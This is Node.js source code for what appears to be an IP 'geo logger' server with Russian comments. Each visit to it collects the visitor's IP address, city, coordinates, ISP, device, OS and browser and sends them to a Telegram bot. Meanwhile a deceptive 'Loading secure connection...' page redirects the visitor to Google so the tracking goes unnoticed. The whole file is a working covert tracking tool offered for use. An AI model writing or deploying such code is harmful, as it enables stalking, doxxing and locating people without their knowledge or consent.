const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = process.env.TOKEN;
const TELEGRAM_CHAT_ID = process.env.CHAT_ID;

function sendToTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN) return;
  axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    chat_id: TELEGRAM_CHAT_ID,
    text: text
  }).catch(e => console.log(e.message));
}

// Получение геоданных по IP
async function getGeo(ip) {
  try {
    const res = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,city,lat,lon,isp,org,query`);
    if (res.data.status === 'success') {
      return {
        country: res.data.country,
        city: res.data.city,
        lat: res.data.lat,
        lon: res.data.lon,
        isp: res.data.isp,
        org: res.data.org
      };
    }
  } catch (e) {}
  return null;
}

// Парсим User-Agent
function parseUA(ua) {
  let device = 'Unknown';
  let os = 'Unknown';
  let browser = 'Unknown';
  
  if (ua.includes('iPhone')) device = 'iPhone';
  else if (ua.includes('iPad')) device = 'iPad';
  else if (ua.includes('Android')) device = 'Android';
  else if (ua.includes('Windows')) device = 'Windows PC';
  else if (ua.includes('Macintosh')) device = 'Mac';
  
  if (ua.includes('Windows NT 10.0')) os = 'Windows 10';
  else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
  else if (ua.includes('Mac OS X')) os = 'macOS';
  else if (ua.includes('Android')) os = 'Android';
  else if (ua.includes('iPhone')) os = 'iOS';
  
  if (ua.includes('Chrome')) browser = 'Chrome';
  else if (ua.includes('Firefox')) browser = 'Firefox';
  else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
  else if (ua.includes('Edg')) browser = 'Edge';
  
  return { device, os, browser };
}

// Все запросы обрабатываем
app.use(async (req, res, next) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;
  const cleanIp = ip.replace('::ffff:', '');
  const ua = req.headers['user-agent'] || 'Unknown';
  const time = new Date().toLocaleString();
  
  const geo = await getGeo(cleanIp);
  const deviceInfo = parseUA(ua);
  
  let message = `📍 NEW VISIT\n`;
  message += `🕒 Time: ${time}\n`;
  message += `🌐 IP: ${cleanIp}\n`;
  
  if (geo) {
    message += `🗺️ Country: ${geo.country}\n`;
    message += `🏙️ City: ${geo.city}\n`;
    message += `📍 Coordinates: ${geo.lat}, ${geo.lon}\n`;
    message += `📡 ISP: ${geo.isp}\n`;
  } else {
    message += `🗺️ Geo: not available\n`;
  }
  
  message += `📱 Device: ${deviceInfo.device}\n`;
  message += `💻 OS: ${deviceInfo.os}\n`;
  message += `🌍 Browser: ${deviceInfo.browser}\n`;
  message += `🔗 UA: ${ua.slice(0, 80)}`;
  
  sendToTelegram(message);
  
  // Отдаём красивую страницу, которая грузится мгновенно
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Redirecting...</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <style>
        body {
          margin: 0;
          padding: 0;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
          background: #0f0f0f;
          color: white;
          display: flex;
          justify-content: center;
          align-items: center;
          height: 100vh;
          text-align: center;
        }
        .container {
          max-width: 300px;
          padding: 20px;
        }
        .spinner {
          width: 40px;
          height: 40px;
          border: 3px solid #2c7be5;
          border-top-color: transparent;
          border-radius: 50%;
          animation: spin 0.8s linear infinite;
          margin: 0 auto 20px;
        }
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        p {
          color: #888;
          font-size: 14px;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="spinner"></div>
        <p>Loading secure connection...</p>
      </div>
      <script>
        setTimeout(() => {
          window.location.href = "https://google.com";
        }, 2000);
      </script>
    </body>
    </html>
  `);
});

app.listen(PORT, () => console.log(`Geo logger running on port ${PORT}`));
